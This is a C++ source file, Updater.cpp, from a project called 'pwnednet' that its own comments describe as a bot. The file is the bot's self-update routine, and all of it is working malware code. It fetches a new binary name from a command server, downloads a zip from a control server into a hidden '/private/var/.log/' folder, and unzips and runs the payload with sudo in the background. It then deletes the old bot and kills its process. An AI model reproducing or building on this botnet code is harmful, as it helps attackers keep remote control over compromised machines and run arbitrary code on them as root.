//
//  Updater.cpp
//  pwnednet
//
/*
 
 OLD FILE IS THE NAME OF THE OLD BOT FILE TO REMOVE
 NEW FILE IS THE NAME OF THE NEW BOT FILE TO DOWNLOAD
 
 
 
 */

#include "include.h"

string oldfile = "pwnednet";
string newfile = "null";

string fOutfile = fPrivate + fVar + "/" + fHelper + "/"; // "/private/var/.log/"


void GetNewFileName();
void InstallDaemon();
void RemoveOldBot();


void Bot::Update() {    // rewrite
    
    GetNewFileName();
    
    
    string url = g_cServer + "assets/b.zip";
    
    string fZip = "/update.zip";
    string fOut = fOutfile + newfile;
    char nFile[FILENAME_MAX];
    fZip.copy(nFile, FILENAME_MAX);
    
    char path[4096];
    realpath(newfile.c_str(), path);
    
    if(strpos(path, BotName)) // if the current bot name is the new bot then return
        return;
    
    
    // Download
    while(!DoesFileExist(fZip)) {
        con->Download(url, nFile);
        sleep(1);
    }
    
    // Move to .log
    while(!DoesFileExist(fOutfile + "update.zip")) {
        rename("/update.zip", cstr(fOutfile + "update.zip"));
        sleep(1);
    }

    // Extract
    while(!DoesFileExist(fOut)) {
        system(cstr("cd " + fOutfile + ";sudo unzip update.zip"));
        sleep(1);
    }

    // Delete zip
    while(DoesFileExist(fOut) && DoesFileExist(fOutfile + "update.zip")) {
        remove(cstr(fOutfile + "update.zip"));
        sleep(1);
    }
    
    
    // Execute
    system(cstr("cd " + fOutfile + "; sudo ./" + newfile + " &"));
    

    string _aa = "\0";
    _aa.copy(nFile, FILENAME_MAX - 1);
    
}

void GetNewFileName() {

    string sendTo = g_Commands + "update.php?request";
    newfile = con->post(sendTo.c_str(), "command=newfile");

}


void RemoveOldBot() {
    
    GetNewFileName();
    
    char path[4096];
    realpath(newfile.c_str(), path);
    
    if(!strpos(path, BotName)) // if the current bot name isnt the new bot then return
        return;
    
    // Remove the bot then kill it
    string pathtooldbot = fOutfile + oldfile;
    
    if(!DoesFileExist(pathtooldbot))
        return;
    
    remove(pathtooldbot.c_str());
    
    pid_t oldpid = Util::GetProcessByName(oldfile.c_str());
    
    if(!oldpid)
        return;
    
    
    system(cstr("kill " + to_string(oldpid)));
    
}

